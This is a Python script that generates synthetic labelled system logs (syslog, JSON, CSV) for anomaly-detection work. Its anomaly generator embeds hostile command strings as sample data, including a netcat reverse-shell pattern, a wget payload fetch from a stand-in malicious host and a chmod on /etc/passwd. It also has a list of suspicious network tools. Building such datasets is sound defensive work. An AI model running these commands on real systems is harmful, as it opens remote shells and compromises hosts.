#!/usr/bin/env python3
"""
Sample Log Dataset Generator for MLSec Project
Generates realistic syslog, JSON, and CSV format logs with normal and anomalous patterns
"""

import random
import json
from datetime import datetime, timedelta
from pathlib import Path

# Configuration
NUM_NORMAL_LOGS = 8000
NUM_ANOMALY_LOGS = 500
OUTPUT_DIR = Path("data/samples")

# Sample data pools
HOSTNAMES = ["webserver01", "dbserver01", "appserver01", "gateway01", "logserver01"]
NORMAL_USERS = ["admin", "webuser", "dbadmin", "operator", "sysadmin"]
ANOMALY_USERS = ["root", "apache", "nobody", "guest"]  # Unusual login attempts

NORMAL_IPS = [
                 f"192.168.1.{i}" for i in range(10, 50)
             ] + [f"10.0.0.{i}" for i in range(5, 25)]

ANOMALY_IPS = [
                  f"203.0.113.{i}" for i in range(1, 50)  # External IPs
              ] + [f"198.51.100.{i}" for i in range(1, 30)]

PROCESSES = {
    "normal": ["sshd", "systemd", "cron", "apache2", "nginx", "mysql", "postgresql"],
    "suspicious": ["nc", "nmap", "wget", "curl", "bash", "python"],
}

SERVICES = ["apache2", "nginx", "mysql", "postgresql", "redis", "sshd"]

SEVERITIES = ["info", "notice", "warning", "error", "critical"]


def generate_timestamp(base_time, offset_minutes):
    """Generate timestamp with offset"""
    return base_time + timedelta(minutes=offset_minutes)


def generate_normal_log(timestamp, log_id):
    """Generate a normal operational log entry"""
    event_type = random.choice(
        [
            "ssh_success",
            "service_start",
            "service_stop",
            "cron_job",
            "db_query",
            "http_request",
        ]
    )

    hostname = random.choice(HOSTNAMES)
    source_ip = random.choice(NORMAL_IPS)
    user = random.choice(NORMAL_USERS)

    if event_type == "ssh_success":
        process = "sshd"
        pid = random.randint(1000, 9999)
        message = f"Accepted password for {user} from {source_ip} port {random.randint(50000, 60000)} ssh2"
        severity = "info"

    elif event_type == "service_start":
        process = "systemd"
        pid = 1
        service = random.choice(SERVICES)
        message = f"Started {service}.service"
        severity = "info"

    elif event_type == "service_stop":
        process = "systemd"
        pid = 1
        service = random.choice(SERVICES)
        message = f"Stopped {service}.service"
        severity = "info"

    elif event_type == "cron_job":
        process = "cron"
        pid = random.randint(1000, 5000)
        message = f"({user}) CMD (/usr/local/bin/backup.sh)"
        severity = "info"

    elif event_type == "db_query":
        process = random.choice(["mysql", "postgresql"])
        pid = random.randint(2000, 8000)
        message = f"Query executed successfully for user {user}"
        severity = "info"

    else:  # http_request
        process = random.choice(["apache2", "nginx"])
        pid = random.randint(3000, 7000)
        status_code = random.choice([200, 200, 200, 304, 404])
        message = f'{source_ip} - - "GET /api/data HTTP/1.1" {status_code}'
        severity = "info" if status_code < 400 else "warning"

    return {
        "id": log_id,
        "timestamp": timestamp,
        "hostname": hostname,
        "process": process,
        "pid": pid,
        "severity": severity,
        "user": user,
        "source_ip": source_ip,
        "message": message,
        "is_anomaly": 0,
    }


def generate_anomaly_log(timestamp, log_id):
    """Generate an anomalous log entry (potential malware/attack indicator)"""
    anomaly_type = random.choice(
        [
            "brute_force",
            "privilege_escalation",
            "port_scan",
            "unusual_process",
            "failed_auth_burst",
            "suspicious_command",
        ]
    )

    hostname = random.choice(HOSTNAMES)
    source_ip = random.choice(ANOMALY_IPS)

    if anomaly_type == "brute_force":
        process = "sshd"
        pid = random.randint(1000, 9999)
        user = random.choice(ANOMALY_USERS)
        message = f"Failed password for {user} from {source_ip} port {random.randint(40000, 50000)} ssh2"
        severity = "warning"

    elif anomaly_type == "privilege_escalation":
        process = "sudo"
        pid = random.randint(5000, 9999)
        user = random.choice(ANOMALY_USERS)
        message = f"{user} : user NOT in sudoers ; TTY=pts/0 ; PWD=/tmp ; COMMAND=/bin/bash"
        severity = "error"

    elif anomaly_type == "port_scan":
        process = "kernel"
        pid = 0
        user = "kernel"
        message = f"[UFW BLOCK] IN=eth0 OUT= SRC={source_ip} DST=192.168.1.1 PROTO=TCP DPT={random.randint(1, 65535)}"
        severity = "warning"

    elif anomaly_type == "unusual_process":
        process = random.choice(PROCESSES["suspicious"])
        pid = random.randint(10000, 30000)
        user = random.choice(ANOMALY_USERS)
        message = f"Process {process} started by {user} from {source_ip}"
        severity = "notice"

    elif anomaly_type == "failed_auth_burst":
        process = "sshd"
        pid = random.randint(1000, 9999)
        user = random.choice(ANOMALY_USERS)
        message = f"authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost={source_ip} user={user}"
        severity = "error"

    else:  # suspicious_command
        process = "bash"
        pid = random.randint(15000, 25000)
        user = random.choice(ANOMALY_USERS)
        commands = [
            "/bin/nc -e /bin/bash",
            "wget http://malicious.com/payload.sh",
            "python -c 'import socket'",
            "chmod 777 /etc/passwd",
        ]
        message = f"Command executed: {random.choice(commands)}"
        severity = "critical"

    return {
        "id": log_id,
        "timestamp": timestamp,
        "hostname": hostname,
        "process": process,
        "pid": pid,
        "severity": severity,
        "user": user,
        "source_ip": source_ip,
        "message": message,
        "is_anomaly": 1,
    }


def format_syslog(log_entry):
    """Format log entry as RFC 3164 syslog"""
    ts = log_entry["timestamp"].strftime("%b %d %H:%M:%S")
    return f"{ts} {log_entry['hostname']} {log_entry['process']}[{log_entry['pid']}]: {log_entry['message']}\n"


def format_json(log_entry):
    """Format log entry as JSON"""
    json_entry = log_entry.copy()
    json_entry["timestamp"] = log_entry["timestamp"].isoformat()
    return json.dumps(json_entry) + "\n"


def format_csv_row(log_entry):
    """Format log entry as CSV row"""
    ts = log_entry["timestamp"].strftime("%Y-%m-%d %H:%M:%S")
    # Escape message for CSV (replace commas and quotes)
    msg = log_entry["message"].replace('"', '""')
    return f'{ts},{log_entry["hostname"]},{log_entry["process"]},{log_entry["severity"]},{log_entry["user"]},{log_entry["source_ip"]},"{msg}",{log_entry["is_anomaly"]}\n'


def generate_datasets():
    """Generate all log datasets"""
    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

    base_time = datetime.now() - timedelta(days=7)
    all_logs = []

    print(f"Generating {NUM_NORMAL_LOGS} normal logs...")
    for i in range(NUM_NORMAL_LOGS):
        timestamp = generate_timestamp(base_time, i * 2)
        all_logs.append(generate_normal_log(timestamp, i))

    print(f"Generating {NUM_ANOMALY_LOGS} anomaly logs...")
    # Intersperse anomalies throughout the dataset
    anomaly_positions = sorted(
        random.sample(range(len(all_logs)), NUM_ANOMALY_LOGS)
    )
    for idx, pos in enumerate(anomaly_positions):
        timestamp = all_logs[pos]["timestamp"] + timedelta(seconds=random.randint(0, 60))
        all_logs.insert(pos, generate_anomaly_log(timestamp, 10000 + idx))

    # Sort by timestamp
    all_logs.sort(key=lambda x: x["timestamp"])

    # Write syslog format
    print("Writing syslog format...")
    with open(OUTPUT_DIR / "sample_logs.syslog", "w") as f:
        for log in all_logs:
            f.write(format_syslog(log))

    # Write JSON format
    print("Writing JSON format...")
    with open(OUTPUT_DIR / "sample_logs.json", "w") as f:
        for log in all_logs:
            f.write(format_json(log))

    # Write CSV format
    print("Writing CSV format...")
    with open(OUTPUT_DIR / "sample_logs.csv", "w") as f:
        # Header
        f.write("timestamp,hostname,process,severity,user,source_ip,message,is_anomaly\n")
        for log in all_logs:
            f.write(format_csv_row(log))

    # Generate statistics file
    print("Writing statistics...")
    stats = {
        "total_logs": len(all_logs),
        "normal_logs": sum(1 for log in all_logs if log["is_anomaly"] == 0),
        "anomaly_logs": sum(1 for log in all_logs if log["is_anomaly"] == 1),
        "anomaly_percentage": (
                sum(1 for log in all_logs if log["is_anomaly"] == 1) / len(all_logs) * 100
        ),
        "time_range": {
            "start": all_logs[0]["timestamp"].isoformat(),
            "end": all_logs[-1]["timestamp"].isoformat(),
        },
        "unique_hosts": len(set(log["hostname"] for log in all_logs)),
        "unique_processes": len(set(log["process"] for log in all_logs)),
    }

    with open(OUTPUT_DIR / "dataset_stats.json", "w") as f:
        json.dump(stats, indent=2, fp=f)

    print(f"\n✓ Dataset generation complete!")
    print(f"  Total logs: {stats['total_logs']}")
    print(f"  Normal: {stats['normal_logs']}")
    print(f"  Anomalies: {stats['anomaly_logs']} ({stats['anomaly_percentage']:.1f}%)")
    print(f"\nFiles created in {OUTPUT_DIR}/:")
    print(f"  - sample_logs.syslog")
    print(f"  - sample_logs.json")
    print(f"  - sample_logs.csv")
    print(f"  - dataset_stats.json")


if __name__ == "__main__":
    generate_datasets()